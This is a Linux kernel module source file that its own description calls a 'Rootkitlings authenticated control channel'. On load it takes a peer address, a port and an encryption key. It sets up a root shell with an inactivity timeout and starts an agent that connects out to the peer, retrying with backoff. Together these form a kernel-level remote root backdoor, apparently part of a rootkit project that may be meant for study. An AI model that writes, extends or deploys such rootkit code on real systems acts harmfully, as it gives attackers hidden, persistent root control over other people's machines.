// SPDX-License-Identifier: GPL-2.0
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/hex.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/string.h>

#include "agent.h"
#include "ipv4.h"
#include "root_shell.h"

static unsigned short peer_port;
module_param(peer_port, ushort, 0400);
MODULE_PARM_DESC(peer_port, "control TCP listener port");

static char peer_address_text[16] = "127.0.0.1";
module_param_string(peer_address, peer_address_text,
		    sizeof(peer_address_text), 0400);
MODULE_PARM_DESC(peer_address, "control IPv4 peer address");

static unsigned int retry_base_ms = 25;
module_param(retry_base_ms, uint, 0400);
MODULE_PARM_DESC(retry_base_ms, "initial reconnect delay in milliseconds");

static unsigned int retry_max_ms = 200;
module_param(retry_max_ms, uint, 0400);
MODULE_PARM_DESC(retry_max_ms, "maximum reconnect delay in milliseconds");

static char control_key[65];
module_param_string(control_key, control_key, sizeof(control_key), 0400);
MODULE_PARM_DESC(control_key, "hex-encoded 256-bit control key");

static unsigned int shell_timeout_ms = 60000;
module_param(shell_timeout_ms, uint, 0400);
MODULE_PARM_DESC(shell_timeout_ms, "root shell inactivity timeout in milliseconds");

static struct rk_agent agent;
static struct rk_root_shell shell;

static int rk_parse_hex_key(const char *hex, u8 *key, size_t key_length)
{
	size_t index;

	if (strlen(hex) != key_length * 2)
		return -EINVAL;
	for (index = 0; index < key_length; index++) {
		int high, low;

		high = hex_to_bin(hex[index * 2]);
		low = hex_to_bin(hex[index * 2 + 1]);
		if (high < 0 || low < 0)
			return -EINVAL;
		key[index] = (u8)((high << 4) | low);
	}
	return 0;
}

static int __init rk_init(void)
{
	u8 key[RK_AEAD_KEY_LENGTH];
	__be32 peer_address;
	int error;

	error = rk_ipv4_parse(peer_address_text, &peer_address);
	if (error || !peer_port || !retry_base_ms ||
	    retry_base_ms > retry_max_ms || retry_max_ms > 5000)
		return -EINVAL;

	error = rk_parse_hex_key(control_key, key, sizeof(key));
	if (error)
		return -EINVAL;

	error = rk_root_shell_init(&shell, shell_timeout_ms);
	if (error)
		goto zeroize_key;

	error = rk_agent_start(&agent, peer_address, peer_port,
			       retry_base_ms, retry_max_ms,
			       key, sizeof(key), &shell);
	if (error)
		goto stop_shell;

	memzero_explicit(key, sizeof(key));
	memzero_explicit(control_key, sizeof(control_key));
	return 0;

stop_shell:
	rk_root_shell_stop(&shell);
zeroize_key:
	memzero_explicit(key, sizeof(key));
	memzero_explicit(control_key, sizeof(control_key));
	return error;
}

static void __exit rk_exit(void)
{
	rk_agent_stop(&agent);
	rk_root_shell_stop(&shell);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rootkitlings authenticated control channel");
